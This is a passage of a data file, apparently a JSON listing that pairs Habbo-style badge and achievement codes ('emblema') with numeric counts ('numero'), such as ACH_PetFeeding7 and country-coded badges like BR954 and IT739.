""emblema"":""NL303"",""numero"":56},{""emblema"":""UK386"",""numero"":688},{""emblema"":""X1534"",""numero"":687},{""emblema"":""X1535"",""numero"":1471},{""emblema"":""BR954"",""numero"":2321},{""emblema"":""BR957"",""numero"":1465},{""emblema"":""DE363"",""numero"":786},{""emblema"":""DE627"",""numero"":1980},{""emblema"":""ES354"",""numero"":3242},{""emblema"":""ES372"",""numero"":2261},{""emblema"":""ES402"",""numero"":2145},{""emblema"":""FR320"",""numero"":2440},{""emblema"":""FR630"",""numero"":2201},{""emblema"":""IT739"",""numero"":2049},{""emblema"":""X1536"",""numero"":21899},{""emblema"":""14X10"",""numero"":255},{""emblema"":""14X13"",""numero"":856},{""emblema"":""14XR2"",""numero"":1775},{""emblema"":""14XR3"",""numero"":2141},{""emblema"":""14XR7"",""numero"":42},{""emblema"":""15H05"",""numero"":961},{""emblema"":""15H06"",""numero"":6930},{""emblema"":""ACH_AllTimeHotelPresence20"",""numero"":19327},{""emblema"":""ACH_AtcgSecret1"",""numero"":18564},{""emblema"":""ACH_AvatarLooks1"",""numero"":65535},{""emblema"":""ACH_BattleBallQuestCompleted10"",""numero"":29104},{""emblema"":""ACH_BattleBallTilesLocked11"",""numero"":8752},{""emblema"":""ACH_BearBreeder3"",""numero"":171},{""emblema"":""ACH_Citizenship1"",""numero"":65535},{""emblema"":""ACH_EmailVerification1"",""numero"":65535},{""emblema"":""ACH_EsA11"",""numero"":2718},{""emblema"":""ACH_FootballGoalScored5"",""numero"":61101},{""emblema"":""ACH_FreezePowerUp6"",""numero"":2210},{""emblema"":""ACH_FreezeQuestCompleted10"",""numero"":26989},{""emblema"":""ACH_FriendListSize13"",""numero"":12566},{""emblema"":""ACH_GnomeFeeding4"",""numero"":1267},{""emblema"":""ACH_GuideAdvertisementReader1"",""numero"":64912},{""emblema"":""ACH_GuideChatReviewRequester2"",""numero"":19114},{""emblema"":""ACH_GuideFeedbackGiver2"",""numero"":65243},{""emblema"":""ACH_GuideGroupMember1"",""numero"":18259},{""emblema"":""ACH_GuideOnDutyPresence9"",""numero"":27387},{""emblema"":""ACH_GuideRequester2"",""numero"":62161},{""emblema"":""ACH_HabboWayGraduate1"",""numero"":65535},{""emblema"":""ACH_HaloompaFeeding5"",""numero"":595},{""emblema"":""ACH_HaloompaLevelUp7"",""numero"":371},{""emblema"":""ACH_HappyHour1"",""numero"":65535},{""emblema"":""ACH_HorseConsecutiveJumpsCount20"",""numero"":65494},{""emblema"":""ACH_LeprechaunRespectGiver1"",""numero"":22044},{""emblema"":""ACH_MonsterPlantColorCollector2"",""numero"":4962},{""emblema"":""ACH_MonsterPlantGardenOfDeath2"",""numero"":6396},{""emblema"":""ACH_MonsterPlantShapeCollector3"",""numero"":3888},{""emblema"":""ACH_MusicPlayer16"",""numero"":809},{""emblema"":""ACH_Name1"",""numero"":65535},{""emblema"":""ACH_PetFeeding7"",""numero"":7487},{""emblema"":""ACH_PetLevelUp8"",""numero"":3284},{""emblema"":""ACH_PetLover6"",""numero"":3031},{""emblema"":""ACH_PetRespectReceiver10"",""numero"":22090},{""emblema"":""ACH_PinataBreaker2"",""numero"":515},{""emblema"":""ACH_PinataWhacker7"",""numero"":1240},{""emblema"":""ACH_RbBunnyTag10"",""numero"":12812},{""emblema"":""ACH_RbTagA10"",""numero"":14131},{""emblema"":""ACH_RespectEarned10"",""numero"":22612},{""emblema"":""ACH_RoomDecoFloor20"",""numero"":5138},{""emblema"":""ACH_RoomDecoFurniCount20"",""numero"":38579},{""emblema"":""ACH_RoomDecoFurniTypeCount20"",""numero"":11642},{""emblema"":""ACH_RoomDecoLandscape20"",""numero"":2828},{""emblema"":""ACH_RoomDecoWallpaper20"",""numero"":5518},{""emblema"":""ACH_RoomEntry20"",""numero"":39072},{""emblema"":""ACH_SafetyQuizGraduate1"",""numero"":65535},{""emblema"":""ACH_SelfModBanSeen1"",""numero"":65535},{""emblema"":""ACH_SelfModChatFloodFilterSeen1"",""numero"":64676},{""emblema"":""ACH_SelfModChatHearRangeSeen1"",""numero"":44700},{""emblema"":""ACH_SelfModChatScrollSpeedSeen1"",""numero"":65535},{""emblema"":""ACH_SelfModDoorModeSeen1"",""numero"":65535},{""emblema"":""ACH_SelfModForumCanModerateSeen1"",""numero"":6001},{""emblema"":""ACH_SelfModForumCanPostSeen1"",""numero"":6005},{""emblema"":""ACH_SelfModForumCanPostThrdSeen1"",""numero"":6006},{""emblema"":""ACH_SelfModForumCanReadSeen1"",""numero"":6003},{""emblema"":""ACH_SelfModIgnoreSeen1"",""numero"":65535},{""emblema"":""ACH_SelfModKickSeen1"",""numero"":65535},{""emblema"":""ACH_SelfModMuteSeen1"",""numero"":65535},{""emblema"":""ACH_SelfModRoomFilterSeen1"",""numero"":63304},{""emblema"":""ACH_SelfModWalkthroughSeen1"",""numero"":64987},{""emblema"":""ACH_TagA10"",""numero"":13838},{""emblema"":""ACH_ViciousViking10"",""numero"":6315},{""emblema"":""ACH_snowBoardBuild5"",""numero"":14289},{""emblema"":""AFC01"",""numero"":2382},{""emblema"":""AI1"",""numero"":207},{""emblema"":""AI2"",""numero"":3091},{""emblema"":""AI6"",""numero"":162},{""emblema"":""AND04"",""numero"":13422},{""emblema"":""APC07"",""numero"":5072},{""emblema"":""APC08"",""numero"":4207},{""emblema"":""APC11"",""numero"":4843},{""emblema"":""APC12"",""numero"":4599},{""emblema"":""APC14"",""numero"":2836},{""emblema"":""APC15"",""numero"":3309},{""emblema"":""APC20"",""numero"":9869},{""emblema"":""APC27"",""numero"":2047},{""emblema"":""ARM01"",""numero"":4222},{""emblema"":""ARM02"",""numero"":2436},{""emblema"":""ARM03"",""numero"":3338},{""emblema"":""ARM04"",""numero"":2710},{""emblema"":""ARM05"",""numero"":1366},{""emblema"":""ARM06"",""numero"":2449},{""emblema"":""ARM07"",""numero"":839},{""emblema"":""ARM08"",""numero"":2113},{""emblema"":""ARM09"",""numero"":2089},{""emblema"":""ARM10"",""numero"":1775},{""emblema"":""ARM11"",""numero"":1275},{""emblema"":""ARM12"",""numero"":1965},{""emblema"":""ARM13"",""numero"":1948},{""emblema"":""ARM14"",""numero"":1763},{""emblema"":""ARM15"",""numero"":1708},{""emblema"":""ARM16"",""numero"":1044},{""emblema"":""ARM17"",""numero"":1799},{""emblema"":""ARM18"",""numero"":1003},{""emblema"":""ARM19"",""numero"":1584},{""emblema"":""ARM20"",""numero"":1713},{""emblema"":""ARM28"",""numero"":792},{""emblema"":""ARM32"",""numero"":1154},{""emblema"":""ARM33"",""numero"":1277},{""emblema"":""ARM34"",""numero"":576},{""emblema"":""ATT02"",""numero"":1665},{""emblema"":""ATT03"",""numero"":1152},{""emblema"":""ATT05"",""numero"":1664},{""emblema"":""BOU02"",""numero"":116},{""emblema"":""BOU07"",""numero"":131},{""emblema"":""BOX01"",""numero"":6000},{""emblema"":""BR456"",""numero"":4037},{""emblema"":""BR457"",""numero"":2677},{""emblema"":""BR463"",""numero"":456},{""emblema"":""BR468"",""numero"":3911},{""emblema"":""BR477"",""numero"":4232},{""emblema"":""BR496"",""numero"":3351},{""emblema"":""BR497"",""numero"":2680},{""emblema"":""BR520"",""numero"":7623},{""emblema"":""BR521"",""numero"":2577},{""emblema"":""BR522"",""numero"":2236},{""emblema"":""BR528"",""numero"":4787},{""emblema"":""BR531"",""numero"":2733},{""emblema"":""BR532"",""numero"":1356},{""emblema"":""BR534"",""numero"":1522},{""emblema"":""BR543"",""numero"":3616},{""emblema"":""BR545"",""numero"":238},{""emblema"":""BR548"",""numero"":6001},{""emblema"":""BR549"",""numero"":1769},{""emblema"":""BR550"",""numero"":4527},{""emblema"":""BR551"",""numero"":3949},{""emblema"":""BR552"",""numero"":4494},{""emblema"":""BR553"",""numero"":5924},{""emblema"":""BR556"",""numero"":3629},{""emblema"":""BR558"",""numero"":3092},{""emblema"":""BR560"",""numero"":2827},{""emblema"":""BR564"",""numero"":2839},{""emblema"":""BR565"",""numero"":2880},{""emblema"":""BR566"",""numero"":2815},{""emblema"":""BR567"",""numero"":2481},{""emblema"":""BR568"",""numero"":2375},{""emblema"":""BR571"",""numero"":6004},{""emblema"":""BR572"",""numero"":4977},{""emblema"":""BR573"",""numero"":5194},{""emblema"":""BR574"",""numero"":4667},{""emblema"":""BR586"",""numero"":3223},{""emblema"":""BR589"",""numero"":7013},{""emblema"":""BR590"",""numero"":6000},{""emblema"":""BR591"",""numero"":4621},{""emblema"":""BR592"",""numero"":3237},{""emblema"":""BR593"",""numero"":3599},{""emblema"":""BR594"",""numero"":4080},{""emblema"":""BR595"",""numero"":3983},{""emblema"":""BR596"",""numero"":3194},{""emblema"":""BR597"",""numero"":4662},{""emblema"":""BR598"",""numero"":3686},{""emblema"":""BR599"",""numero"":302},{""emblema"":""BR600"",""numero"":131},{""emblema"":""BR601"",""numero"":3720},{""emblema"":""BR602"",""numero"":4448},{""emblema"":""BR603"",""numero"":3830},{""emblema"":""BR606"",""numero"":6017},{""emblema"":""BR607"",""numero"":2859},{""emblema"":""BR608"",""numero"":4117},{""emblema"":""BR609"",""numero"":3383},{""emblema"":""BR610"",""numero"":3565},{""emblema"":""BR611"",""numero"":6001},{""emblema"":""BR612"",""numero"":6001},{""emblema"":""BR613"",""numero"":6000},{""emblema"":""BR614"",""numero"":6000},{""emblema"":""BR624"",""numero"":455},{""emblema"":""BR631"",""numero"":1384},{""emblema"":""BR641"",""numero"":3931},{""emblema"":""BR652"",""numero"":9343},{""emblema"":""BR653"",""numero"":6005},{""emblema"":""BR654"",""numero"":3165},{""emblema"":""BR655"",""numero"":5778},{""emblema"":""BR656"",""numero"":5991},{""emblema"":""BR658"",""numero"":4810},{""emblema"":""BR659"",""numero"":4935},{""emblema"":""BR660"",""numero"":4110},{""emblema"":""BR661"",""numero"":3563},{""emblema"":""BR662"",""numero"":5367},{""emblema"":""BR663"",""numero"":2952},{""emblema"":""BR666"",""numero"":6128},{""emblema"":""BR673"",""numero"":91},{""emblema"":""BR674"",""numero"":176},{""emblema"":""BR677"",""numero"":5348},{""emblema"":""BR681"",""numero"":5560},{""emblema"":""BR683"",""numero"":4982},{""emblema"":""BR684"",""numero"":3509},{""emblema"":""BR688"",""numero"":8603},{""emblema"":""BR690"",""numero"":4422},{""emblema"":""BR694"",""numero"":1434},{""emblema"":""BR695"",""numero"":4632},{""emblema"":""BR697"",""numero"":14900},{""emblema"":""BR698"",""numero"":2185},{""emblema"":""BR699"",""numero"":4418},{""emblema"":""BR700"",""numero"":4131},{""emblema"":""BR702"",""numero"":2328},{""emblema"":""BR703"",""numero"":2446},{""emblema"":""BR705"",""numero"":2647},{""emblema"":""BR706"",""numero"":299},{""emblema"":""BR707"",""numero"":4895},{""emblema"":""BR708"",""numero"":5205},{""emblema"":""BR710"",""numero"":52},{""emblema"":""BR714"",""numero"":5200},{""emblema"":""BR724"",""numero"":2958},{""emblema"":""BR726"",""numero"":5585},{""emblema"":""BR728"",""numero"":3494},{""emblema"":""BR729"",""numero"":1197},{""emblema"":""BR776"",""numero"":6000},{""emblema"":""BR777"",""numero"":2453},{""emblema"":""BR778"",""numero"":5040},{""emblema"":""BR779"",""numero"":165},{""emblema"":""BR781"",""numero"":4190},{""emblema"":""BR783"",""numero"":3549},{""emblema"":""BR785"",""numero"":3695},{""emblema"":""BR789"",""numero"":3951},{""emblema"":""BR792"",""numero"":4381},{""emblema"":""BR793"",""numero"":3588},{""emblema"":""BR794"",""numero"":4656},{""emblema"":""BR801"",""numero"":223},{""emblema"":""BR802"",""numero"":88},{""emblema"":""BR812"",""numero"":69},{""emblema"":""BR813"",""numero"":25},{""emblema"":""BR814"",""numero"":1964},{""emblema"":""BR815"",""numero"":59},{""emblema"":""BR817"",""numero"":175},{""emblema"":""BR818"",""numero"":68},{""emblema"":""BR828"",""numero"":179},{""emblema"":""BR829"",""numero"":32},{""emblema"":""BR831"",""numero"":3098},{""emblema"":""BR834"",""numero"":70},{""emblema"":""BR835"",""numero"":22},{""emblema"":""BR836"",""numero"":33},{""emblema"":""BR839"",""numero"":3280},{""emblema"":""BR840"",""numero"":7210},{""emblema"":""BR841"",""numero"":5475},{""emblema"":""BR842"",""numero"":6001},{""emblema"":""BR844"",""numero"":3214},{""emblema"":""BR846"",""numero"":2319},{""emblema"":""BR850"",""numero"":58},{""emblema"":""BR853"",""numero"":1768},{""emblema"":""BR858"",""numero"":47},{""emblema"":""BR861"",""numero"":3316},{""emblema"":""BR872"",""numero"":2466},{""emblema"":""BR874"",""numero"":2855},{""emblema"":""BR876"",""numero"":584},{""emblema"":""BR881"",""numero"":152},{""emblema"":""BR883"",""numero"":4158},{""emblema"":""BR885"",""numero"":2290},{""emblema"":""BR886"",""numero"":316},{""emblema"":""BR887"",""numero"":3124},{""emblema"":""BR888"",""numero"":4555},{""emblema"":""BR889"",""numero"":5347},{""emblema"":""BR893"",""numero"":4041},{""emblema"":""BR894"",""numero"":470},{""emblema"":""BR896"",""numero"":21742},{""emblema"":""BR897"",""numero"":2898},{""emblema"":""BR898"",""numero"":5142},{""emblema"":""BR899"",""numero"":876},{""emblema"":""BR902"",""numero"":3167},{""emblema"":""BR903"",""numero"":3940},{""emblema"":""BR907"",""numero"":3259},{""emblema"":""BR919"",""numero"":164},{""emblema"":""BR932"",""numero"":4721},{""emblema"":""BR937"",""numero"":3548},{""emblema"":""BR938"",""numero"":5769},{""emblema"":""BR940"",""numero"":94},{""emblema"":""BR946"",""numero"":4053},{""emblema"":""BTF01"",""numero"":1167},{""emblema"":""BUN02"",""numero"":1871},{""emblema"":""BUN05"",""numero"":2755},{""emblema"":""BUN06"",""numero"":1488},{""emblema"":""BUN10"",""numero"":1492},{""emblema"":""BUN14"",""numero"":271},{""emblema"":""CAN01"",""numero"":1722},{""emblema"":""CAN02"",""numero"":1197},{""emblema"":""CAN04"",""numero"":1628},{""emblema"":""CHK02"",""numero"":1231},{""emblema"":""CHK03"",""numero"":3055},{""emblema"":""CHK04"",""numero"":2187},{""emblema"":""CHK05"",""numero"":1048},{""emblema"":""CHK06"",""numero"":2844},{""emblema"":""CHK07"",""numero"":330},{""emblema"":""CHK08"",""numero"":1075},{""emblema"":""CHK09"",""numero"":886},{""emblema"":""CIN01"",""numero"":4207},{""emblema"":""COM03"",""numero"":545},{""emblema"":""COM14"",""numero"":1851},{""emblema"":""COM21"",""numero"":2100},{""emblema"":""COM24"",""numero"":1990},{""emblema"":""COM66"",""numero"":3486},{""emblema"":""COM89"",""numero"":2992},{""emblema"":""CP001"",""numero"":10268},{""emblema"":""CP003"",""numero"":3977},{""emblema"":""CP005"",""numero"":3242},{""emblema"":""CP007"",""numero"":3150},{""emblema"":""CP009"",""numero"":1239},{""emblema"":""CP011"",""numero"":2536},{""emblema"":""CP013"",""numero"":2263},{""emblema"":""CP015"",""numero"":1605},{""emblema"":""CP017"",""numero"":930},{""emblema"":""CYB02"",""numero"":1103},{""emblema"":""CYB05"",""numero"":258},{""emblema"":""DE024"",""numero"":552},{""emblema"":""DE069"",""numero"":4426},{""emblema"":""DE147"",""numero"":5492},{""emblema"":""DE176"",""numero"":4231},{""emblema"":""DE222"",""numero"":2701},{""emblema"":""DE227"",""numero"":105},{""emblema"":""DE236"",""numero"":7241},{""emblema"":""DE239"",""numero"":6125},{""emblema"":""DE244"",""numero"":19},{""emblema"":""DE246"",""numero"":1797},{""emblema"":""DE247"",""numero"":1739},{""emblema"":""DE248"",""numero"":1960},{""emblema"":""DE249"",""numero"":3221},{""emblema"":""DE252"",""numero"":6044},{""emblema"":""DE254"",""numero"":4190},{""emblema"":""DE295"",""numero"":7353},{""emblema"":""DE312"",""numero"":3619},{""emblema"":""DE326"",""numero"":4047},{""emblema"":""DE353"",""numero"":441},{""emblema"":""DE364"",""numero"":2605},{""emblema"":""DE400"",""numero"":198},{""emblema"":""DE408"",""numero"":2900},{""emblema"":""DE422"",""numero"":4816},{""emblema"":""DE431"",""numero"":166},{""emblema"":""DE434"",""numero"":510},{""emblema"":""DE447"",""numero"":21},{""emblema"":""DE468"",""numero"":74},{""emblema"":""DE471"",""numero"":5274},{""emblema"":""DE491"",""numero"":177},{""emblema"":""DE493"",""numero"":3299},{""emblema"":""DE495"",""numero"":4398},{""emblema"":""DE503"",""numero"":441},{""emblema"":""DE508"",""numero"":848},{""emblema"":""DE523"",""numero"":2703},{""emblema"":""DE528"",""numero"":3902},{""emblema"":""DE538"",""numero"":6011},{""emblema"":""DE539"",""numero"":99},{""emblema"":""DE553"",""numero"":2135},{""emblema"":""DE563"",""numero"":2623},{""emblema"":""DE597"",""numero"":1780},{""emblema"":""DE601"",""numero"":185},{""emblema"":""DE613"",""numero"":6946},{""emblema"":""DE620"",""numero"":3856},{""emblema"":""DE638"",""numero"":104},{""emblema"":""DE695"",""numero"":19},{""emblema"":""DE699"",""numero"":421},{""emblema"":""DE700"",""numero"":15},{""emblema"":""DE715"",""numero"":212},{""emblema"":""DE720"",""numero"":5399},{""emblema"":""DE771"",""numero"":4794},{""emblema"":""DE789"",""numero"":242},{""emblema"":""DE818"",""numero"":14},{""emblema"":""DK013"",""numero"":6021},{""emblema"":""EAH01"",""numero"":6001},{""emblema"":""EAS05"",""numero"":178},{""emblema"":""EPCPT"",""numero"":9976},{""emblema"":""ERB01"",""numero"":2533},{""emblema"":""ES229"",""numero"":72},{""emblema"":""ES305"",""numero"":5176},{""emblema"":""ES307"",""numero"":225},{""emblema"":""ES309"",""numero"":12007},{""emblema"":""ES323"",""numero"":4333},{""emblema"":""ES326"",""numero"":3769},{""emblema"":""ES333"",""numero"":4527},{""emblema"":""ES374"",""numero"":724},{""emblema"":""ES375"",""numero"":71},{""emblema"":""ES401"",""numero"":2018},{""emblema"":""ES404"",""numero"":7177},{""emblema"":""ES413"",""numero"":1075},{""emblema"":""ES446"",""numero"":3925},{""emblema"":""ES449"",""numero"":5544},{""emblema"":""ES450"",""numero"":459},{""emblema"":""ES465"",""numero"":3714},{""emblema"":""ES483"",""numero"":1204},{""emblema"":""ES496"",""numero"":4508},{""emblema"":""ES518"",""numero"":136},{""emblema"":""ES562"",""numero"":1258},{""emblema"":""ES590"",""numero"":8961},{""emblema"":""ES591"",""numero"":3768},{""emblema"":""ES593"",""numero"":4531},{""emblema"":""ES618"",""numero"":1923},{""emblema"":""ES632"",""numero"":968},{""emblema"":""ES638"",""numero"":2832},{""emblema"":""ES654"",""numero"":4611},{""emblema"":""ES672"",""numero"":6008},{""emblema"":""ES679"",""numero"":79},{""emblema"":""ES700"",""numero"":154},{""emblema"":""ES701"",""numero"":3962},{""emblema"":""ES702"",""numero"":3003},{""emblema"":""ES704"",""numero"":2199},{""emblema"":""ES720"",""numero"":17},{""emblema"":""ES729"",""numero"":4785},{""emblema"":""ES731"",""numero"":4551},{""emblema"":""ES755"",""numero"":77},{""emblema"":""ES771"",""numero"":3280},{""emblema"":""ES780"",""numero"":6233},{""emblema"":""ES782"",""numero"":3890},{""emblema"":""ES789"",""numero"":162},{""emblema"":""ES794"",""numero"":5195},{""emblema"":""ES818"",""numero"":4871},{""emblema"":""ES819"",""numero"":4030},{""emblema"":""ES821"",""numero"":2699},{""emblema"":""ES822"",""numero"":2318},{""emblema"":""ES823"",""numero"":1437},{""emblema"":""ES824"",""numero"":1324},{""emblema"":""ES825"",""numero"":4165},{""emblema"":""ES826"",""numero"":203},{""emblema"":""ES831"",""numero"":3223},{""emblema"":""ES842"",""numero"":2887},{""emblema"":""ES854"",""numero"":3921},{""emblema"":""ES866"",""numero"":3501},{""emblema"":""ES867"",""numero"":2500},{""emblema"":""ES872"",""numero"":3111},{""emblema"":""ES877"",""numero"":186},{""emblema"":""ES879"",""numero"":4695},{""emblema"":""ES882"",""numero"":72},{""emblema"":""ES901"",""numero"":2738},{""emblema"":""ES903"",""numero"":2077},{""emblema"":""ES929"",""numero"":3717},{""emblema"":""ES930"",""numero"":4392},{""emblema"":""ES935"",""numero"":3630},{""emblema"":""ES936"",""numero"":2699},{""emblema"":""ES942"",""numero"":2450},{""emblema"":""EST01"",""numero"":6001},{""emblema"":""EST04"",""numero"":5275},{""emblema"":""EST05"",""numero"":4817},{""emblema"":""EST06"",""numero"":3158},{""emblema"":""EST07"",""numero"":2834},{""emblema"":""EST08"",""numero"":3171},{""emblema"":""EST09"",""numero"":3426},{""emblema"":""EST10"",""numero"":3666},{""emblema"":""EST11"",""numero"":3233},{""emblema"":""EST12"",""numero"":3354},{""emblema"":""EST13"",""numero"":3750},{""emblema"":""EST14"",""numero"":3263},{""emblema"":""EST15"",""numero"":3646},{""emblema"":""EST17"",""numero"":5159},{""emblema"":""EST18"",""numero"":5504},{""emblema"":""EST19"",""numero"":4155},{""emblema"":""FAN06"",""numero"":2413},{""emblema"":""FBC00"",""numero"":250},{""emblema"":""FI070"",""numero"":6001},{""emblema"":""FI085"",""numero"":1796},{""emblema"":""FI129"",""numero"":28},{""emblema"":""FI132"",""numero"":2842},{""emblema"":""FI134"",""numero"":6002},{""emblema"":""FI141"",""numero"":29},{""emblema"":""FPB01"",""numero"":847},{""emblema"":""FR072"",""numero"":4411},{""emblema"":""FR092"",""numero"":2855},{""emblema"":""FR257"",""numero"":4144},{""emblema"":""FR340"",""numero"":224},{""emblema"":""FR349"",""numero"":4180},{""emblema"":""FR374"",""numero"":6312},{""emblema"":""FR375"",""numero"":4234},{""emblema"":""FR380"",""numero"":2979},{""emblema"":""FR384"",""numero"":3765},{""emblema"":""FR389"",""numero"":3775},{""emblema"":""FR397"",""numero"":3474},{""emblema"":""FR418"",""numero"":3640},{""emblema"":""FR419"",""numero"":4776},{""emblema"":""FR429"",""numero"":4037},{""emblema"":""FR433"",""numero"":6002},{""emblema"":""FR451"",""numero"":2330},{""emblema"":""FR465"",""numero"":3924},{""emblema"":""FR475"",""numero"":3233},{""emblema"":""FR513"",""numero"":3376},{""emblema"":""FR545"",""numero"":1865},{""emblema"":""FR596"",""numero"":3114},{""emblema"":""FR598"",""numero"":153},{""emblema"":""FR6"",""numero"":4313},{""emblema"":""FR606"",""numero"":203},{""emblema"":""FR613"",""numero"":6207},{""emblema"":""FR7"",""numero"":932},{""emblema"":""FR721"",""numero"":3701},{""emblema"":""FR735"",""numero"":5835},{""emblema"":""FSC01"",""numero"":18515},{""emblema"":""FSC02"",""numero"":18575},{""emblema"":""FSC03"",""numero"":18636},{""emblema"":""Football_DE"",""numero"":6006},{""emblema"":""Football_ES"",""numero"":5669},{""emblema"":""Football_IT"",""numero"":5743},{""emblema"":""Football_PT"",""numero"":5965},{""emblema"":""H1503"",""numero"":371},{""emblema"":""H1504"",""numero"":348},{""emblema"":""H1505"",""numero"":399},{""emblema"":""HIT02"",""numero"":6395},{""emblema"":""HOSP3"",""numero"":549},{""emblema"":""HS004"",""numero"":1134},{""emblema"":""HS006"",""numero"":1107},{""emblema"":""HS008"",""numero"":665},{""emblema"":""HS009"",""numero"":1067},{""emblema"":""HS010"",""numero"":2509},{""emblema"":""HS011"",""numero"":2334},{""emblema"":""HS012"",""numero"":2926},{""emblema"":""HS015"",""numero"":386},{""emblema"":""HS016"",""numero"":424},{""emblema"":""HS017"",""numero"":453},{""emblema"":""HS018"",""numero"":2002},{""emblema"":""HS021"",""numero"":632},{""emblema"":""HS022"",""numero"":1286},{""emblema"":""HS026"",""numero"":2725},{""emblema"":""HS028"",""numero"":834},{""emblema"":""HS036"",""numero"":50},{""emblema"":""HS038"",""numero"":647},{""emblema"":""HS054"",""numero"":237},{""emblema"":""HS057"",""numero"":782},{""emblema"":""HS077"",""numero"":6537},{""emblema"":""HS078"",""numero"":3521},{""emblema"":""HST03"",""numero"":968},{""emblema"":""HST04"",""numero"":9858},{""emblema"":""HST07"",""numero"":1927},{""emblema"":""HST18"",""numero"":4558},{""emblema"":""HST25"",""numero"":875},{""emblema"":""HST27"",""numero"":678},{""emblema"":""HST38"",""numero"":3116},{""emblema"":""HST42"",""numero"":1713},{""emblema"":""HST44"",""numero"":3859},{""emblema"":""HST55"",""numero"":2252},{""emblema"":""HST62"",""numero"":1838},{""emblema"":""HST79"",""numero"":1441},{""emblema"":""HST80"",""numero"":1638},{""emblema"":""HST81"",""numero"":1388},{""emblema"":""HST82"",""numero"":1489},{""emblema"":""HST85"",""numero"":1399},{""emblema"":""HST86"",""numero"":3926},{""emblema"":""HST87"",""numero"":4156},{""emblema"":""HST88"",""numero"":4038},{""emblema"":""HST89"",""numero"":3636},{""emblema"":""HST90"",""numero"":4865},{""emblema"":""HU001"",""numero"":8651},{""emblema"":""HU002"",""numero"":4112},{""emblema"":""HU003"",""numero"":5423},{""emblema"":""HU004"",""numero"":1613},{""emblema"":""HU005"",""numero"":1482},{""emblema"":""HU006"",""numero"":1623},{""emblema"":""HU007"",""numero"":1681},{""emblema"":""HU008"",""numero"":1669},{""emblema"":""HU009"",""numero"":1644},{""emblema"":""HU010"",""numero"":876},{""emblema"":""HU011"",""numero"":832},{""emblema"":""HU012"",""numero"":817},{""emblema"":""HU013"",""numero"":4395},{""emblema"":""HU023"",""numero"":632},{""emblema"":""HU024"",""numero"":624},{""emblema"":""HU025"",""numero"":4132},{""emblema"":""IPH01"",""numero"":19649},{""emblema"":""IT037"",""numero"":4378},{""emblema"":""IT057"",""numero"":2520},{""emblema"":""IT153"",""numero"":3597},{""emblema"":""IT228"",""numero"":2445},{""emblema"":""IT239"",""numero"":3201},{""emblema"":""IT242"",""numero"":1680},{""emblema"":""IT246"",""numero"":2617},{""emblema"":""IT251"",""numero"":2163},{""emblema"":""IT279"",""numero"":3946},{""emblema"":""IT312"",""numero"":8594},{""emblema"":""IT322"",""numero"":6000},{""emblema"":""IT326"",""numero"":19},{""emblema"":""IT366"",""numero"":4465},{""emblema"":""IT376"",""numero"":3920},{""emblema"":""IT407"",""numero"":183},{""emblema"":""IT409"",""numero"":5260},{""emblema"":""IT432"",""numero"":5800},{""emblema"":""IT451"",""numero"":8100},{""emblema"":""IT466"",""numero"":3023},{""emblema"":""IT476"",""numero"":1463},{""emblema"":""IT502"",""numero"":4292},{""emblema"":""IT534"",""numero"":3710},{""emblema"":""IT542"",""numero"":3010},{""emblema"":""IT548"",""numero"":3065},{""emblema"":""IT554"",""numero"":34},{""emblema"":""IT558"",""numero"":113},{""emblema"":""IT562"",""numero"":13039},{""emblema"":""IT592"",""numero"":1918},{""emblema"":""IT593"",""numero"":1768},{""emblema"":""IT601"",""numero"":1900},{""emblema"":""IT607"",""numero"":115},{""emblema"":""IT613"",""numero"":3373},{""emblema"":""IT619"",""numero"":2749},{""emblema"":""IT636"",""numero"":3031},{""emblema"":""IT641"",""numero"":4777},{""emblema"":""IT645"",""numero"":3099},{""emblema"":""IT655"",""numero"":906},{""emblema"":""IT694"",""numero"":4396},{""emblema"":""IT703"",""numero"":1983},{""emblema"":""IT705"",""numero"":305},{""emblema"":""IT708"",""numero"":6003},{""emblema"":""IT723"",""numero"":3451},{""emblema"":""IT733"",""numero"":3260},{""emblema"":""IT759"",""numero"":3743},{""emblema"":""IT789"",""numero"":37},{""emblema"":""IT791"",""numero"":218},{""emblema"":""IT797"",""numero"":4747},{""emblema"":""IT804"",""numero"":35},{""emblema"":""IT814"",""numero"":578},{""emblema"":""IT831"",""numero"":91},{""emblema"":""IT847"",""numero"":46},{""emblema"":""IT852"",""numero"":96},{""emblema"":""IT854"",""numero"":1926},{""emblema"":""IT900"",""numero"":108},{""emblema"":""IT948"",""numero"":3639},{""emblema"":""IT952"",""numero"":303},{""emblema"":""IT960"",""numero"":3464},{""emblema"":""IT969"",""numero"":2024},{""emblema"":""IT977"",""numero"":924},{""emblema"":""IT978"",""numero"":3825},{""emblema"":""IT979"",""numero"":3548},{""emblema"":""ITA07"",""numero"":1801},{""emblema"":""J14B2"",""numero"":2912},{""emblema"":""JP3"",""numero"":1975},{""emblema"":""JP6"",""numero"":1715},{""emblema"":""JPV01"",""numero"":5364},{""emblema"":""JPV03"",""numero"":5569},{""emblema"":""JPV05"",""numero"":5356},{""emblema"":""JPV07"",""numero"":4341},{""emblema"":""JPV09"",""numero"":4005},{""emblema"":""JPV11"",""numero"":4612},{""emblema"":""JPV13"",""numero"":4075},{""emblema"":""JPV15"",""numero"":4323},{""emblema"":""JPV17"",""numero"":4608},{""emblema"":""JPV20"",""numero"":475},{""emblema"":""JR001"",""numero"":6442},{""emblema"":""JR002"",""numero"":6006},{""emblema"":""JR003"",""numero"":5130},{""emblema"":""JR004"",""numero"":4159},{""emblema"":""JR005"",""numero"":3876},{""emblema"":""JR006"",""numero"":5323},{""emblema"":""JR007"",""numero"":3618},{""emblema"":""JR008"",""numero"":3148},{""emblema"":""JR009"",""numero"":3216},{""emblema"":""JR010"",""numero"":3572},{""emblema"":""JR011"",""numero"":3026},{""emblema"":""JR012"",""numero"":2432},{""emblema"":""JR015"",""numero"":2552},{""emblema"":""JR021"",""numero"":2178},{""emblema"":""JR026"",""numero"":420},{""emblema"":""JR027"",""numero"":315},{""emblema"":""JR028"",""numero"":209},{""emblema"":""JR029"",""numero"":205},{""emblema"":""KIT09"",""numero"":3001},{""emblema"":""KIT10"",""numero"":3096},{""emblema"":""KIT11"",""numero"":2148},{""emblema"":""KIT12"",""numero"":1528},{""emblema"":""KIT13"",""numero"":1084},{""emblema"":""KIT14"",""numero"":2326},{""emblema"":""KIT15"",""numero"":1410},{""emblema"":""KIT16"",""numero"":3249},{""emblema"":""KIT17"",""numero"":6831},{""emblema"":""KIT18"",""numero"":3005},{""emblema"":""KIT19"",""numero"":3096},{""emblema"":""KIT20"",""numero"":2152},{""emblema"":""KIT21"",""numero"":1528},{""emblema"":""KIT22"",""numero"":1085},{""emblema"":""MM002"",""numero"":1812},{""emblema"":""MM008"",""numero"":3144},{""emblema"":""MM009"",""numero"":5925},{""emblema"":""MM010""